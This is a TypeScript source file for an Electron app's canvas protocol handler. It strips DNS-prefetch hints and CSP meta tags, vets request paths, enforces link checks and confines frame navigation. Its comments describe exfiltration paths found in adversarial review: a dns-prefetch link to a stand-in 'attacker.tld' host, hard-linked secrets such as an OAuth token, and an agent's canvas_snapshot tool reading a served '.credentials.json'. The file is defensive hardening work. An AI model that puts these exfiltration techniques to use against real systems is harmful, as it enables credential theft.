 * bridge and make canvas_snapshot/canvas_review fail invisibly.
 *
 * WHY THE HINTS (adversarial review 2026-08-16, finding #2). `<link
 * rel=dns-prefetch href="//<chunk>.attacker.tld">` is a DNS query per chunk at
 * the attacker's own resolver, and nothing in CSP covers it. The strip is the
 * parser-time half; `X-DNS-Prefetch-Control: off` in baseHeaders is the half
 * that also reaches script-created hints.
 *
 * A `rel` carrying other tokens keeps them — only the hint tokens are dropped,
 * tokenised on the DECODED value (`relTokens`, so a `&#32;` separator cannot
 * fuse `stylesheet` to a hint and take it down with it) and written back from
 * the RAW substrings so nothing can be injected through the rewrite (a decoded
 * token could contain the quote that ends the attribute). An element whose
 * `rel` was ONLY hints is removed outright.
 */
export function sanitizeServedHtml(html: string): string {
  return rewriteMarkup(html, (tag, start) => {
    if (tag.name === 'meta') {
      const httpEquiv = tag.attrs.get('http-equiv')
      if (httpEquiv === undefined) return null
      if (!CSP_PRAGMA_RE.test(decodeAttrCharRefs(httpEquiv.value).trim().toLowerCase())) return null
      return { start, end: tag.end, text: '' }
    }
    if (tag.name === 'link') {
      const rel = tag.attrs.get('rel')
      if (rel === undefined) return null
      const tokens = relTokens(rel.value)
      const kept = tokens.filter((token) => !EGRESS_HINT_RELS.has(token.decoded.toLowerCase()))
      if (kept.length === tokens.length) return null
      if (kept.length === 0) return { start, end: tag.end, text: '' }
      return {
        start: rel.start,
        end: rel.end,
        text: kept.map((token) => rel.value.slice(token.rawStart, token.rawEnd)).join(' '),
      }
    }
    return null
  })
}

/** Windows reserved device basenames (CON/NUL/COM1/…) — kept in sync with the
 *  store's normalizeEntry so both ingress paths reject a device read. */
const WIN_RESERVED_BASENAME = /^(con|prn|aux|nul|com[1-9]|lpt[1-9]|conin\$|conout\$)$/i

/** Decode and vet the path segments after the version id. Returns null on
 *  anything that is not a plain file/dir name. Self-sufficient against the
 *  Win32 forms libuv would otherwise normalize (trailing dot/space, all-dot
 *  segments, device names), so confinement never leans on the fs layer. */
export function sanitizeContentPath(rawSegments: string[]): string[] | null {
  const segments: string[] = []
  for (const raw of rawSegments) {
    let decoded: string
    try {
      decoded = decodeURIComponent(raw)
    } catch {
      return null
    }
    if (decoded === '' || /^\.+$/.test(decoded)) return null // '', '.', '..', '...'
    // A decoded slash would smuggle a separator into the join ('..%2f..'),
    // backslash and colon cover Windows separators / drives / ADS, NUL is NUL.
    if (/[/\\:\0]/.test(decoded)) return null
    if (/[. ]$/.test(decoded)) return null // Win32 strips a trailing '.'/' '
    if (WIN_RESERVED_BASENAME.test(decoded.split('.')[0])) return null
    segments.push(decoded)
  }
  return segments
}

/** Inject the bridge <script> into an HTML document at serve time. The tag is
 *  external + same-origin, so it works under both content CSPs. */
export function injectBridgeTag(html: string): string {
  const tag = `<script src="${CANVAS_BRIDGE_PATH}" defer></script>`
  const headClose = /<\/head\s*>/i.exec(html)
  if (headClose) return html.slice(0, headClose.index) + tag + html.slice(headClose.index)
  const bodyClose = /<\/body\s*>/i.exec(html)
  if (bodyClose) return html.slice(0, bodyClose.index) + tag + html.slice(bodyClose.index)
  return html + tag
}

/**
 * Serve one already-contained file. Returns null when the file must not be
 * served at all (the caller answers the uniform 404).
 *
 * Exported for tests, the same reason `sanitizeContentPath` is: the entry
 * guard below is only reachable end-to-end through a FILE symlink that changes
 * the extension under realpath, which needs a privilege Windows does not grant
 * by default — an unreachable-in-CI guard is an untested one.
 *
 * BLOCKER 1, second half (adversarial review, 2026-08-15). Two changes:
 *
 *  1. The content type comes from the file's OWN extension. It used to be
 *     `isEntryHtml || ext === '.html'` — the entry was FORCED to `text/html`
 *     whatever it actually was, and the bridge was injected into it. A version
 *     whose entry named `.credentials.json` therefore came back `200 text/html`
 *     with a working bridge, and `canvas_snapshot` — which the agent already
 *     holds — read the contents back out of the DOM. An entry that is not an
 *     HTML file is now refused outright rather than dressed up as one.
 *  2. The read goes through `readCheckedFile`: one open, all checks on that fd.
 *     The protocol had NO link check at any layer, so a hard link planted
 *     inside a served root defeated the realpath layer with nothing to delete
 *     and nothing to see — the pass walked an OAuth token out through one.
 */
export function serveFile(
  filePath: string,
  servable: ServableVersion,
  isEntry: boolean,
  method: string,
): Response | null {
  const ext = path.extname(filePath).toLowerCase()
  // ONE predicate, shared with the store's write ingress. It used to be spelled
  // here as an extension compare and there as `/\.(html|htm)$/i`, which disagree
  // on the string `.html` (`path.extname('.html')` is ''): the store accepted an
  // entry this function then refused, so a canvas could be rendered and never
  // served. Two definitions of "is HTML" either strand content or, drifting the
  // other way, admit a document one half never agreed to.
  const isHtml = isHtmlDocumentPath(filePath)
  // The entry is the DOCUMENT — the thing the frame loads as a page and the one
  // file the bridge is injected into. `normalizeEntry` already refuses a
  // non-HTML entry at both write ingresses; this is the serve-side half, so a
  // record that reached memory another way (disk reload, an older build's
  // record) cannot promote a data file into the document slot either.
  if (isEntry && !isHtml) return null
  const csp = servable.mode === 'design' ? DESIGN_CSP : UAT_CSP
  const contentType = isHtml ? MIME_BY_EXT['.html'] : (MIME_BY_EXT[ext] ?? 'application/octet-stream')

  // Link discipline, scoped to what it is for.
  //
  // The ENTRY keeps the hard refusal in every mode: it is the document the
  // bridge is injected into and the one canvas_snapshot reads back out of the
  // DOM, so it is the object a hard-linked secret has to occupy to be exfiltrated
  // directly. DESIGN content keeps it too — a design version's root is CCC's own
  // `<resources>/canvas/<id>/versions/<vid>/`, written by the store itself, where
  // a second name for an inode is never legitimate and never accidental.
  //
  // A UAT SUBORDINATE ASSET is the one case where multiplicity is ordinary: the
  // content root is a real `dist/`, and pnpm, `cp -al` and Nx/Turbo/Bazel cache
  // restores all populate one with hard links. Refusing those turned a normal
  // monorepo build into a page whose every chunk 404'd — with only a generic
  // console.warn from the outer catch, so the user saw a blank UAT pane and no
  // reason for it. Containment still holds for these (lexical + realpath + the
  // per-session root), and the anomaly is LOGGED rather than silently allowed.
  const requireSingleLink = isEntry || servable.mode === 'design'
  let data: Buffer
  try {
    data = readCheckedFile(filePath, MAX_SERVED_FILE_BYTES, {
      requireSingleLink,
      onLinkAnomaly: (nlink) => {
        console.warn(
          `[ccc-ux] serving a multiply-linked UAT asset (nlink=${nlink ?? 'unreported'}): ${filePath} — ` +
            'normal for hardlink-deduplicated build output (pnpm, cp -al, Nx/Turbo/Bazel cache restore).',
        )
      },
    })
  } catch (err) {
    // Named and reasoned, not the outer catch's uniform shrug: this is the one
    // 404 a user cannot diagnose from the outside. The response stays identical.
    console.warn(`[ccc-ux] refused to serve ${filePath} (entry=${isEntry}, mode=${servable.mode}): ${(err as Error)?.message ?? err}`)
    return null
  }
  if (isHtml) {
    // Sanitise BEFORE injecting: the bridge tag is ours and must not be walked
    // by a scanner that is looking for someone else's markup.
    const html = injectBridgeTag(sanitizeServedHtml(data.toString('utf8')))
    return new Response(method === 'HEAD' ? null : html, { status: 200, headers: baseHeaders(contentType, csp) })
  }
  const body = method === 'HEAD' ? null : new Uint8Array(data.buffer, data.byteOffset, data.byteLength)
  return new Response(body, { status: 200, headers: baseHeaders(contentType, csp) })
}

/**
 * The ccc-ux:// request handler. Exported directly so unit tests can drive it
 * with plain fetch Requests — no Electron needed.
 */
export async function handleCccUxRequest(request: Request): Promise<Response> {
  try {
    const method = request.method.toUpperCase()
    if (method !== 'GET' && method !== 'HEAD') {
      return new Response('Method not allowed', {
        status: 405,
        headers: { 'Content-Type': 'text/plain; charset=utf-8', 'X-Content-Type-Options': 'nosniff' },
      })
    }

    const url = new URL(request.url)
    const canvasId = url.hostname
    if (!CANVAS_ID_RE.test(canvasId)) return notFound()

    // The bridge is version-independent and mounted on an absolute path so an
    // injected <script src> survives any document location. The analysis chunk
    // sits beside it and is fetched by the bridge's own dynamic import() the
    // first time a snapshot asks for issue analysis.
    if (url.pathname === CANVAS_BRIDGE_PATH) {
      return new Response(method === 'HEAD' ? null : bridgeSource, {
        status: 200,
        headers: baseHeaders(MIME_BY_EXT['.js']),
      })
    }
    if (url.pathname === CANVAS_ANALYSIS_PATH) {
      // ~600 KB, served `no-store` like the bridge.
      //
      // It previously carried `public, max-age=31536000, immutable` on a path
      // with no build identifier — but a canvasId is PERSISTED, so that URL is
      // stable across app upgrades while its body changes with every build. A
      // year-long immutable entry could keep serving the PREVIOUS axe-core into
      // the frame after an update (silently declining a security bump), and a new
      // bridge paired with an old chunk trips "exposed no run()" — i.e. the rule
      // pass stops running, which is exactly the invisible failure this feature
      // has already had twice. Re-serving an in-process string measures ~1 ms,
      // and a page can defeat any cache with `fetch(…, {cache:'reload'})` anyway.
      return new Response(method === 'HEAD' ? null : analysisSource, {
        status: 200,
        headers: baseHeaders(MIME_BY_EXT['.js']),
      })
    }

    const rawSegments = url.pathname.split('/').filter((s) => s.length > 0)
    if (rawSegments.length === 0) return notFound()
    const versionId = rawSegments[0]
    if (!CANVAS_VERSION_ID_RE.test(versionId)) return notFound()

    const servable = getServableVersion(canvasId, versionId)
    if (!servable) return notFound()

    const segments = sanitizeContentPath(rawSegments.slice(1))
    if (segments === null) return notFound()
    const relPath = segments.length > 0 ? segments.join('/') : servable.entry
    const isEntryRequest = segments.length === 0

    // Layer 2: lexical containment under the content root.
    let filePath: string
    try {
      filePath = validatePath(path.join(servable.contentRoot, relPath), servable.contentRoot)
    } catch {
      return notFound()
    }

    // Layer 3: physical containment. The root is trusted as an anchor (it may
    // itself be a junction/symlink); everything BELOW it must really live there.
    let realRoot: string
    try {
      realRoot = fs.realpathSync.native(servable.contentRoot)
    } catch {
      return notFound()
    }

    let stat: fs.Stats | null = null
    try {
      stat = fs.statSync(filePath)
    } catch {
      stat = null
    }

    if (stat === null || stat.isDirectory()) {
      // SPA fallback (spec §7): extensionless UAT routes fall back to the entry.
      const lastSegment = segments[segments.length - 1] ?? ''
      const looksLikeRoute = servable.mode === 'uat' && !isEntryRequest && !lastSegment.includes('.')
      if (!looksLikeRoute) return notFound()
      try {
        filePath = validatePath(path.join(servable.contentRoot, servable.entry), servable.contentRoot)
        stat = fs.statSync(filePath)
      } catch {
        return notFound()
      }
      // Equivalent under test and labelled rather than tested around: reading a
      // directory throws in `serveFile` and the catch at the bottom turns that
      // into the same 404. It stays because "fails closed twice" is the design —
      // this branch refuses on purpose, the other refuses by accident.
      if (stat.isDirectory()) return notFound()
      const realEntry = fs.realpathSync.native(filePath)
      if (realEntry !== realRoot && !realEntry.startsWith(realRoot + path.sep)) return notFound()
      if (stat.size > MAX_SERVED_FILE_BYTES) return notFound()
      // Serve the canonical (link-resolved) path, matching the main branch — no
      // window between the containment check and the read where the lexical
      // path could resolve elsewhere.
      return serveFile(realEntry, servable, true, method) ?? notFound()
    }

    let realTarget: string
    try {
      realTarget = fs.realpathSync.native(filePath)
    } catch {
      return notFound()
    }
    if (realTarget !== realRoot && !realTarget.startsWith(realRoot + path.sep)) return notFound()
    if (stat.size > MAX_SERVED_FILE_BYTES) return notFound()

    return serveFile(realTarget, servable, isEntryRequest, method) ?? notFound()
  } catch (err) {
    console.warn('[ccc-ux] request failed:', err)
    return notFound()
  }
}

/**
 * Must run at MODULE SCOPE of src/main/index.ts — before app ready — or the
 * scheme is not privileged and fetch/storage inside canvas documents break.
 * `bypassCSP` is deliberately absent (spec §3.1).
 */
export function registerCccUxSchemePrivileges(): void {
  protocol.registerSchemesAsPrivileged([
    {
      scheme: CCC_UX_SCHEME,
      privileges: { standard: true, secure: true, supportFetchAPI: true },
    },
  ])
}

/** Call inside app.whenReady(), before any window exists. */
export function registerCccUxProtocolHandler(): void {
  protocol.handle(CCC_UX_SCHEME, (request) => handleCccUxRequest(request))
}

// ---------------------------------------------------------------------------
// Frame navigation confinement (main-process backstop)
// ---------------------------------------------------------------------------

/** `ccc-ux://<canvasId>/<versionId>` for a URL, or null if it is not one of
 *  ours. Nothing below the version id matters — a version is one origin+scope
 *  and a document may move freely inside it (SPA links, reload). */
function canvasScopeOf(url: string): string | null {
  if (typeof url !== 'string' || url.length === 0) return null
  let parsed: URL
  try {
    parsed = new URL(url)
  } catch {
    return null
  }
  if (parsed.protocol !== `${CCC_UX_SCHEME}:`) return null
  const versionId = parsed.pathname.split('/').filter((s) => s.length > 0)[0] ?? ''
  return `${parsed.hostname}/${versionId}`
}

/**
 * May a frame currently at `currentUrl` navigate to `targetUrl`?
 *
 * The rule is one sentence: ONCE A FRAME IS SHOWING A CANVAS VERSION IT MAY
 * ONLY EVER NAVIGATE WITHIN THAT VERSION. A frame that is not showing a canvas
 * (`about:blank`, the app's own document) is not this function's business and
 * is allowed — that is the initial mount, and the app renderer's
 * `will-navigate` + `frame-src ccc-ux:` govern it.
 *
 * An empty string answers "not a canvas" here too, which is a true statement
 * about the STRING and not a decision about a navigation: the guard below no
 * longer routes one here, because an empty url does not say which document is
 * navigating. See `installCanvasFrameNavigationGuard`.
 *
 * WHAT THIS CLOSES (adversarial review, 2026-08-15). `will-navigate` fires for
 * the MAIN FRAME ONLY, so before this the entire off-origin defence for canvas
 * content was one `frame-src ccc-ux:` token in the renderer CSP — which permits
 * the whole scheme, i.e. EVERY canvas:
 *
 *   - cross-canvas theft. `window.name` survives navigation and is
 *     origin-agnostic: navigate to `ccc-ux://B`, read B's contentRoot
 *     same-origin, stash it in `window.name`, navigate back to A, read it out.
 *     A complete primitive, gated only on canvas ids being unguessable.
 *   - version confusion. Self-navigating to another VERSION of the same canvas
 *     defeats the iframe `key` mitigation the pane relies on: the renderer's
 *     registered frame keeps its old `versionId`, so `canvas_snapshot` is
 *     answered from a different version's document than the one main stamps
 *     onto the result.
 *
 * Both are the same shape and both are closed by the same comparison, which is
 * why this is one function and not two.
 */
export function isCanvasFrameNavigationAllowed(currentUrl: string, targetUrl: string): boolean {
  const from = canvasScopeOf(currentUrl)
  if (from === null) return true
  return canvasScopeOf(targetUrl) === from
}

/** The shape of Electron's `will-frame-navigate` event, narrowed to what the
 *  guard reads. Structural so the guard is testable without an Electron window
 *  — an untestable guard is one nobody can prove still works. */
export interface CanvasFrameNavigationDetails {
  url: string
  isMainFrame: boolean
  /** `parent` is read only to tell the canvas pane's own iframe (whose parent is
   *  the APP's document) from a subframe of a canvas document — see the
   *  empty-url rule on the installer. */
  frame?: { url?: string; parent?: { url?: string } | null } | null
  initiator?: { url?: string } | null
  preventDefault: () => void
}

export interface FrameNavigationEmitter {
  on(event: 'will-frame-navigate', listener: (details: CanvasFrameNavigationDetails) => void): unknown
}

/** One ALLOWED full-document navigation inside a canvas frame (M3). */
export interface CanvasFrameNavigatedFact {
  canvasId: string
  versionId: string
  /** pathname + hash of the target, capped. Page-chosen text: it is the URL the
   *  document navigated to, so it is marked as page-reported wherever shown. */
  route: string
}

type CanvasFrameNavigatedSink = (fact: CanvasFrameNavigatedFact) => void

let frameNavigatedSink: CanvasFrameNavigatedSink | null = null

/**
 * Where an allowed canvas-frame navigation gets reported (M3 action trail).
 *
 * A SINK rather than a parameter on the installer, because the guard is
 * installed from `main/index.ts` (which holds the window) while the thing that
 * needs to hear about it is the canvas IPC layer (which holds the canvas →
 * session mapping and the push). One registration point keeps the guard itself
 * free of both.
 */
export function setCanvasFrameNavigatedSink(sink: CanvasFrameNavigatedSink | null): void {
  frameNavigatedSink = sink
}

/** Longest route reported. Matches the shared stamp bound — the trail and the
 *  stamp show the same kind of string and must agree about how long it can be. */
const MAX_REPORTED_ROUTE_CHARS = 512

/**
 * The route a canvas URL points at, as pathname + hash — or null when it is not
 * a canvas URL at all.
 *
 * NEVER THE QUERY STRING. A query is where applications put tokens, ids and
 * search terms, and the trail's whole discipline is structure without content;
 * the route says WHERE the user went, and that is the pathname.
 */
function reportableRoute(url: string): { canvasId: string; versionId: string; route: string } | null {
  let parsed: URL
  try {
    parsed = new URL(url)
  } catch {
    return null
  }
  if (parsed.protocol !== `${CCC_UX_SCHEME}:`) return null
  const segments = parsed.pathname.split('/').filter((s) => s.length > 0)
  const versionId = segments[0] ?? ''
  if (!CANVAS_ID_RE.test(parsed.hostname) || !CANVAS_VERSION_ID_RE.test(versionId)) return null
  // The path BELOW the version id is what the page calls its route; the version
  // segment is our own addressing and would be noise in every trail line.
  const route = `/${segments.slice(1).join('/')}${parsed.hash}`.slice(0, MAX_REPORTED_ROUTE_CHARS)
  return { canvasId: parsed.hostname, versionId, route }
}

/**
 * The ONE navigation an unidentified frame is allowed to be: the canvas pane's
 * own iframe, which has committed nothing yet (`frame.url === ''`), taking its
 * first hop INTO a canvas version.
 *
 * Both halves are needed. The parent test is what separates the pane's frame —
 * a direct child of the app's own document — from an uncommitted subframe
 * INSIDE a canvas document, which reports the same empty url and whose parent
 * IS canvas content. The target test is what keeps the allowance to a mount
 * rather than to any first hop: a frame nobody can identify navigating OFF the
 * scheme is the exfiltration shape, not a mount.
 */
/** Tell the sink about an allowed navigation. Never lets a listener's throw
 *  reach the guard: the guard's job is the refusal, and a reporting failure must
 *  not change a navigation decision. */
function reportFrameNavigation(url: string): void {
  const sink = frameNavigatedSink
  if (!sink) return
  const fact = reportableRoute(url)
  if (!fact) return
  try {
    sink(fact)
  } catch (err) {
    console.warn('[ccc-ux] frame-navigation listener failed:', err)
  }
}

function isCanvasPaneMount(details: CanvasFrameNavigationDetails): boolean {
  const parentUrl = details.frame?.parent?.url
  if (typeof parentUrl !== 'string' || parentUrl.length === 0) return false
  return canvasScopeOf(parentUrl) === null && canvasScopeOf(details.url) !== null
}

/**
 * Install the subframe navigation guard on the main window's webContents.
 *
 * The main frame is deliberately left alone: `will-navigate` already cancels
 * every main-frame navigation, and duplicating that here would put two owners
 * on one rule.
 *
 * BOTH the navigating frame's current URL and the INITIATOR's are checked, and
 * either one may refuse. `details.frame` is documented as possibly null (the
 * frame may already have navigated or been destroyed), and a guard whose only
 * input can be null is a guard with an off switch; the initiator covers that
 * case, and for a self-navigation the two are the same frame anyway.
 *
 * WHEN NO SOURCE IDENTIFIES THE NAVIGATING DOCUMENT THE ANSWER IS NO
 * (adversarial review, 2026-08-16). The loop used to fall through to "allowed"
 * when neither source was a string, which is the one case where the guard knows
 * NOTHING about who is navigating — exactly when it must not decide in the
 * navigation's favour. The `catch` below fails closed on a throw, but this was
 * not a throw.
 *
 * AN EMPTY STRING IS NOT INFORMATION EITHER, and that is the second half of the
 * same finding. The note that stood here called `''` "a frame with no committed
 * document, i.e. the initial mount", and concluded it had to stay allowed or
 * the pane would never mount. The first half is true and the second does not
 * follow: an uncommitted SUBFRAME of a canvas document — a src-less `<iframe>`
 * a canvas page created — reports `''` too, and `canvasScopeOf('')` is null, so
 * it was free to take its first hop anywhere.
 *
 * An empty url is therefore dropped from the source list rather than counted as
 * an allowing one. That changes the outcome in exactly ONE case: when it was
 * the only source. (When it is not, the loop already answers from the other one
 * — it refuses if ANY source refuses, so an allowing `''` never overrode
 * anything.) Blanking the pane would take that case AND the mount reporting no
 * initiator, so the allowance is NARROWED to the mount's own shape instead of
 * removed: an uncommitted frame whose PARENT is not canvas content, hopping
 * INTO a canvas version. Both mount sites (`AgentCanvasPane` and the off-screen
 * capture frame) are direct children of the app's own document, so they pass;
 * a src-less child of a canvas document has a canvas parent and fails; a frame
 * that reports no parent at all fails, which is the fail-closed direction.
 *
 * WHAT THIS CANNOT SETTLE HERE: whether `will-frame-navigate` reports
 * `initiator` and `frame.parent` for an iframe's FIRST src load is a property
 * of the running Electron, not of this module — the unit tests drive the
 * listener with a structural double, and only a real window can answer it. The
 * shapes that already refused before this change (`frame` null with no
 * initiator) still refuse, so the exposure added is bounded to one: a mount
 * that reports neither an initiator nor a parent would refuse and leave the
 * pane blank, with the console.warn below as the only trace.
 */
export function installCanvasFrameNavigationGuard(contents: FrameNavigationEmitter): void {
  contents.on('will-frame-navigate', (details) => {
    try {
      if (details.isMainFrame) return
      const sources = [details.frame?.url, details.initiator?.url].filter(
        (source): source is string => typeof source === 'string' && source.length > 0,
      )
      if (sources.length === 0) {
        if (isCanvasPaneMount(details)) return
        details.preventDefault()
        console.warn(
          `[ccc-ux] blocked a canvas frame navigation with no identifiable source (to ${details.url})`,
        )
        return
      }
      for (const source of sources) {
        if (isCanvasFrameNavigationAllowed(source, details.url)) continue
        details.preventDefault()
        console.warn(
          `[ccc-ux] blocked a canvas frame navigation out of its version (from ${source} to ${details.url})`,
        )
        return
      }
      // ALLOWED, and it is a canvas URL: report it for the Testing action trail
      // (M3). A full-document navigation never reaches the in-page bridge's
      // `navigated` event — the document that would have sent it is being
      // replaced — so without this the trail simply loses every real page load.
      //
      // Reported from MAIN's own reading of the target URL, and the session is
      // resolved downstream from main's canvas → session map: the page has no
      // say in which session hears about this, which is the property that keeps a
      // report from becoming a cross-session write primitive.
      reportFrameNavigation(details.url)
    } catch (err) {
      // A throw inside an Electron event listener does not cancel anything, so
      // failing closed has to be explicit.
      try {
        details.preventDefault()
      } catch {
        /* nothing further to do */
      }
      console.warn('[ccc-ux] frame navigation guard failed, navigation refused:', err)
    }
  })
}

// ---------------------------------------------------------------------------
// Permission requests
// ---------------------------------------------------------------------------

/** True for a document served by this protocol. Origin-scoped rather than
 *  blanket so the guard below cannot be widened by accident into "deny the app
 *  its own clipboard". */
export function isCanvasOrigin(url: string | undefined | null): boolean {
  if (typeof url !== 'string' || url.length === 0) return false
  try {
    return new URL(url).protocol === `${CCC_UX_SCHEME}:`
  } catch {
    return false
  }
}

export interface PermissionCapableSession {
  setPermissionRequestHandler(
    handler:
      | ((
          webContents: unknown,
          permission: string,
          callback: (granted: boolean) => void,
          details?: { requestingUrl?: string },
        ) => void)
      | null,
  ): void
  setPermissionCheckHandler(
    handler: ((webContents: unknown, permission: string, requestingOrigin: string, details?: unknown) => boolean) | null,
  ): void
}

/**
 * Deny every powerful-feature request made by canvas content.
 *
 * Electron grants permission requests by default and the app installed no
 * handler on the DEFAULT session at all (the one in account-web/artifacts.ts is
 * on that window's own partition), so until now a canvas document could ask for
 * geolocation, camera, microphone, midi or clipboard-read and be granted
 * silently — and `captureHeadless` runs such a document with no UI at all.
 *
 * SCOPED TO ccc-ux ORIGINS, NOT BLANKET, AND THAT IS DELIBERATE. The default
 * session also serves the app's own renderer, whose `navigator.clipboard.write`
 * calls (the Copy buttons on this very feature's empty state, on Cloud Agents,
 * and in both Excalidraw panes) go through this handler as
 * `clipboard-sanitized-write`. `() => false` would break a shipped feature to
 * close a canvas hole; refusing by origin closes the hole exactly. Non-canvas
 * origins are granted, which is the behaviour that shipped.
 */
export function installCanvasPermissionGuard(sess: PermissionCapableSession): void {
  sess.setPermissionRequestHandler((_webContents, _permission, callback, details) => {
    callback(!isCanvasOrigin(details?.requestingUrl))
  })
  // The synchronous half: `navigator.permissions.query`, device enumeration and
  // the checks Chromium makes without a request. Same origin rule.
  sess.setPermissionCheckHandler((_webContents, _permission, requestingOrigin) => !isCanvasOrigin(requestingOrigin))
}
